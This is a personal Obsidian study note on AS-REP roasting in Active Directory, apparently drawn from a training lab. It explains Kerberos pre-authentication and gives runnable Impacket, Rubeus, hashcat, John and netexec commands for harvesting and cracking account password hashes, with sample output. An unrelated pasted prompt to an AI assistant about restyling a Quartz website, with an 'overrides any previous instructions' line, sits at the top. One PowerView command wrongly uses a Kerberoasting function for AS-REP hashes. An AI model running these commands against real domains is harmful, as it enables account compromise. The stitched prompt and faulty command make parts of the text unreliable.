---
created: 2026-08-03
updated: 2026-10-18
tags:
  - AD
  - AD_attacks
  - Kerberos
---
```
This project is a Quartz website. All notes are inside the /content subdirectory and are out-of-scope for this specific session (telling you this explicitly, overrides any previous instructions I gave, but only for this session). We are now working on the website itself, its features and representation.


First, let's work on the style.
Instead of using a default Obsidian theme, modify it to match the vibes of my content and my preferences: sci-fi, dark-themed only; as accent colors, user red or blue (or use them together). 
```

## AS-REP roasting

- At the beginning of Kerberos authentication, a client requests a **TGT** (Ticket-Granting Ticket) from the KDC (Key Distribution Center) by sending an Authentication Service Request (`AS-REQ`). This request is sent before the client has any credentials in the current session.
- The `AS-REQ` typically includes **pre-authentication data**: a timestamp encrypted with a key derived from the client's password. This key is called the client's **long-term key**.
- The AS decrypts the timestamp using the corresponding key it stores for the account and verifies that it falls within the acceptable clock skews (5 minutes by default). This demonstrates that the client possesses the account's long-term key without transmitting the key itself.

>[!note] See [[Kerberos#1. AS exchange (KRBASREQ / KRBASREP)]].

- Kerberos pre-authentication can be disabled for an account through the `DONT_REQUIRE_PREAUTH` flag in the `userAccountControl` attribute. When this flag is set, the AS can issue an `AS-REP` without first verifying that the requester actually holds the client's long-term key.
- Therefore, you can request an `AS-REP` for an account with pre-authentication disabled without knowing the account's password or long-term key.
---
- Part of `AS-REP` — the portion intended for the client — is encrypted with the client's long-term key. If you capture the response, you can extract this material and attempt to **crack the password offline**: take a candidate password, derive the corresponding Kerberos key, and attempt to decrypt the captured data. A successful decryption identifies the correct candidate password and, consequently, the corresponding long-term key. 

> **AS-REP roasting** is a Kerberos attack in which an attacker requests an `AS-REP` (Authentication Service Response) for a domain account with pre-authentication disabled and uses the returned encrypted material to attempt offline password cracking.

> [!note] See [[Kerberos]].
### `UserAccountControl` and `DONT_REQUIRE_PREAUTH`

- Pre-authentication status is controlled by the `userAccountControl` (`UAC`) attribute on user objects in Active Directory.
- The specific flag is `DONT_REQUIRE_PREAUTH` (also known as `UF_DONT_REQUIRE_PREAUTH`), which has a bitmask value of `4194304` (`0x400000`).
- Administrators sometimes enable this flag for legacy application compatibility, automated scripts, or migration scenarios.

### AS-REP roasting exchange

Normally, Kerberos requires clients to prove their identity (pre-authentication) before the Key Distribution Center (KDC) issues a Ticket Granting Ticket (TGT). When this requirement is disabled—often for legacy application compatibility—the KDC responds to an **Authentication Server Request (`AS-REQ`)** by sending an **Authentication Server Response (`AS-REP`)** containing a TGT encrypted with the user’s password hash, without first verifying the user's identity.


0. **Enumeration**
	- Enumerate AD accounts that do not require Kerberos pre-authentication (`DONT_REQUIRE_PREAUTH` flag enabled).
1. **`KRB_AS_REQ` (Authentication request)**
	- Send an `AS-REQ` message to the KDC requesting a TGT for the target user *without including any pre-authentication data* (`PA-DATA`).
2. **KDC processing**
	- The KDC checks the target account's `userAccountControl` attribute in Active Directory.
	- Seeing that `DONT_REQUIRE_PREAUTH` is set, the KDC does not demand proof of the password.
	- It generates a TGT and a random session key (`K_C,TGT`), then constructs the `AS-REP` message.
	- Part of the `AS-REP` (containing the session key and metadata) is **encrypted using the target user's long-term secret key** (derived from their password).
3. **`KRB_AS_REP` (Authentication reply)**
	- The KDC returns the `AS-REP` to the client.
4. **Offline cracking (roasting)**
	- Extract the encrypted section of the `AS-REP` message.
	- Perform offline brute-force cracking against candidate passwords by deriving keys and attempting decryption until valid data is recovered.

> [!important] Computer accounts and gMSAs enforce pre-authentication by default and have long, complex passwords. Focus roasting efforts on **human user accounts** with `DONT_REQUIRE_PREAUTH` set.

## Encryption types and Hashcat modes

- The encryption type (`enctype`) used in the `AS-REP` reply dictates the speed and feasibility of offline cracking.

| Encryption type (`enctype`) | Value | Hashcat mode | Description |
| --- | --- | --- | --- |
| `RC4-HMAC` | `23` (`0x17`) | `18200` | Encrypted using a key derived directly from the account's NTLM hash; very fast to crack. |
| `AES128-CTS-HMAC-SHA1-96` | `17` (`0x11`) | `19800` | Key derivation uses PBKDF2 with 4,096 iterations; significantly slower. |
| `AES256-CTS-HMAC-SHA1-96` | `18` (`0x12`) | `19900` | PBKDF2 with 4,096 iterations and 256-bit key; slowest to crack. |

> [!note] Unlike Kerberoasting, AS-REP roasting output format differs in Hashcat. RC4 uses mode `18200` for `AS-REP` compared to `13100` for `TGS-REP`.

- Hashcat modes summary for AS-REP roasting:

| Encryption | Ticket format | Hashcat mode |
| --- | --- | --- |
| RC4 (`etype 23`) | `$krb5asrep$23$...` | `18200` |
| AES-128 (`etype 17`) | `$krb5asrep$17$...` | `19800` |
| AES-256 (`etype 18`) | `$krb5asrep$18$...` | `19900` |

## Executing AS-REP roasting

### AS-REP roasting from Linux (`GetNPUsers.py`)

- Impacket's `GetNPUsers.py` queries Domain Controllers for accounts with Kerberos pre-authentication disabled, requests `AS-REP` responses, and formats the output for Hashcat or John the Ripper.

- Unauthenticated roasting using a list of usernames:

```bash
GetNPUsers.py -dc-ip 172.16.5.5 -usersfile users.txt EXAMPLE.COM/
```

- Authenticated roasting using valid domain credentials (automatically enumerates AD via LDAP):

```bash
GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name:password -request
```

> [!example]-
> ```bash
> impacket-GetNPUsers -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
> ```
> 
> ```bash
> Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
> 
> Password:
> Name      MemberOf                                           PasswordLastSet             LastLogon                  
> --------  -------------------------------------------------  --------------------------  --------------------------
> hsimpson  CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-03-15 10:14:22.127432  2026-07-30 08:12:04.606617
> 
> $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
> ```

- Save extracted hashes directly to a file:

```bash
GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name:password -request -outputfile asrep_hashes.txt
```

- Use an NTLM hash for authentication:

```bash
GetNPUsers.py -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -request
```

- Use Kerberos ticket cache (`ccache`):

```bash
export KRB5CCNAME=/path/to/ticket.ccache
GetNPUsers.py -k -no-pass -dc-ip 172.16.5.5 EXAMPLE.COM/svc_name -request
```

| Option | Description |
| --- | --- |
| `-dc-ip` | IP address of the target Domain Controller. |
| `-usersfile` | Path to a text file containing target usernames (one per line) for unauthenticated roasting. |
| `-request` | Requests `AS-REP` for vulnerable accounts and prints hashes in Hashcat/JtR format. |
| `-outputfile` | Saves the output hashes directly to the specified file. |
| `-format` | Specify hash format (`hashcat` or `john`; default is `hashcat`). |

### AS-REP roasting from Windows (`PowerView`)

- Use `PowerView` to enumerate accounts with pre-authentication disabled:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol, pwdlastset
```

- Using Active Directory PowerShell module:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth, PwdLastSet | Select-Object SamAccountName, DoesNotRequirePreAuth, PwdLastSet
```

- Request AS-REP hashes using `PowerView`'s `Get-DomainSPNTicket` equivalent or custom script wrappers:

```powershell
Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket -Format Hashcat
```

### AS-REP roasting from Windows (`Rubeus`)

- `Rubeus` provides full-featured AS-REP roasting capabilities natively on Windows.

- Enumerate vulnerable accounts without requesting tickets (recon mode):

```powershell
Rubeus.exe asreproast /stats
```

- Roast all accounts in the current domain with pre-authentication disabled:

```powershell
Rubeus.exe asreproast /nowrap
```

> [!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe asreproast /nowrap
> ```
> 
> ```powershell
>    ______        _                      
>   (_____ \      | |                     
>    _____) )_   _| |__  _____ _   _  ___ 
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/ 
> 
>   v2.0.2 
> 
> [*] Action: AS-REP Roasting
> 
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] SamAccountName         : hsimpson
> [*] DistinguishedName      : CN=Homer Simpson,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] PwdLastSet             : 3/15/2022 10:14:22 AM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
> ```

- Roast a specific target account:

```powershell
Rubeus.exe asreproast /user:hsimpson /nowrap
```

- Perform unauthenticated roasting against a specific user by targeting a DC directly:

```powershell
Rubeus.exe asreproast /user:hsimpson /domain:inlanefreight.local /dc:172.16.5.5 /nowrap
```

- Save extracted hashes directly to a file:

```powershell
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

| Option | Description |
| --- | --- |
| `/user:username` | Target a specific user account for AS-REP roasting. |
| `/usersfile:file.txt` | Read target usernames from a text file for batch roasting. |
| `/domain:domain.local` | Specify the target domain name. |
| `/dc:dc01.domain.local` | Specify the target Domain Controller IP/FQDN. |
| `/ou:"LDAP OU"` | Limit search to a specific Organizational Unit. |
| `/format:hashcat\|john` | Choose hash output format (`hashcat` or `john`). |
| `/outfile:file.txt` | Write roasting output hashes to a file. |
| `/nowrap` | Output hashes without line wrapping for easy copying. |
| `/stats` | Display vulnerable accounts count without requesting tickets. |

## Cracking AS-REP hashes offline

- Extract the `$krb5asrep$...` hashes and run Hashcat using the corresponding mode.

- Crack RC4 AS-REP hashes (`etype 23`):

```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

> [!example]-
> ```bash
> hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
> ```
> 
> ```bash
> hashcat (v6.2.6) starting
> 
> Hashes: 1 digests; 1 unique digests
> Status...........: Cracked
> Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
> Hash.Target......: $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:...
> 
> $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c...$05d...:DohNut123!
> ```

- Crack AES-256 AS-REP hashes (`etype 18`):

```bash
hashcat -m 19900 -a 0 aes256_asrep.txt /usr/share/wordlists/rockyou.txt
```

- Using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

## Validating a recovered password

- Verify the cracked password against domain services using `netexec` or `crackmapexec`:

```bash
netexec smb 172.16.5.5 -u hsimpson -p 'DohNut123!'
```

- Test over WinRM:

```bash
netexec winrm 172.16.5.5 -u hsimpson -p 'DohNut123!'
```

## References and further reading

- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
- [`Roasting AS-REPs — HarmJ0y (SpecterOps)`](https://www.harmj0y.net/blog/redteaming/roasting-as-reps/)
- [`AS-REP Roasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/as-rep-roasting)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket GetNPUsers — Fortra GitHub`](https://github.com/fortra/impacket)
- [`Event 4768 — A Kerberos authentication ticket (TGT) was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [`UserAccountControl Flags — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)


## drafts

- Like [[Kerberoasting]], AS-REP roasting abuses *legitimate, intended protocol behavior* rather than a software vulnerability.
- When Kerberos pre-authentication is disabled for an account, the Key Distribution Center (KDC) will issue an `AS-REP` containing ticket data encrypted with that account's password-derived secret key **without verifying the client's identity first**.

>[!note]+ AS-REP roasting vs. Kerberoasting
>- [[Kerberoasting]] abuses the **TGS exchange** (`KRB_TGS_REQ` / `KRB_TGS_REP`); AS-REP roasting abuses **AS exchange** (`KRB_AS_REQ` / `KRB_AS_REP`)**.
>- [[Kerberoasting]] requires a valid authenticated domain context to request Service Tickets (`TGS-REQ`); AS-REP roasting can be performed **without any domain credentials (unauthenticated)** — as long as you know valid domain user account names or can enumerate them.
>- Kerberoasting targets accounts with SPNs (Service Principal Names) during the TGS exchange; AS-REP roasting targets accounts with the `DONT_REQUIRE_PREAUTH` flag enabled in `UserAccountControl `(UAC) during the AS exchange.


- The traffic generated during roasting consists of standard `AS-REQ` requests — generating Event `4768` (A Kerberos authentication ticket was requested) on the Domain Controller, but no failed logons (`4625`).
- The extracted ticket data is cracked **entirely offline**, meaning no network traffic or failed login attempts occur during brute-force operations.



- Prerequisites for the attack:
	- **Network connectivity to a Domain Controller** (TCP/UDP port `88`, Kerberos).
	- **Target account(s) with pre-authentication disabled** (`DONT_REQUIRE_PREAUTH` / `UF_DONT_REQUIRE_PREAUTH`).
	- **Valid username(s)** for unauthenticated roasting. 

## How AS-REP roasting works

### On Kerberos pre-authentication

- In standard Kerberos authentication (`AS-REQ`), pre-authentication is enforced to prevent offline password guessing attacks.
- Normally, when a client requests a Ticket-Granting Ticket (TGT), it sends a timestamp encrypted with its long-term key (derived from the user's password) in the `PA-ENC-TIMESTAMP` field of the `AS-REQ`.
- The KDC decrypts the timestamp using the user's password hash stored in Active Directory. If decryption succeeds and the timestamp is within acceptable clock skew (default 5 minutes), the KDC confirms the client knows the password and issues a `KRB_AS_REP` containing the TGT and an encrypted session key.
- If pre-authentication is disabled for a user account, the KDC **skips this verification step entirely**.


>[!bug] Disabling Kerberos pre-authentication allows anyone who knows the account's `sAMAccountName` to request an encrypted ticket blob for that account from the DC at any time.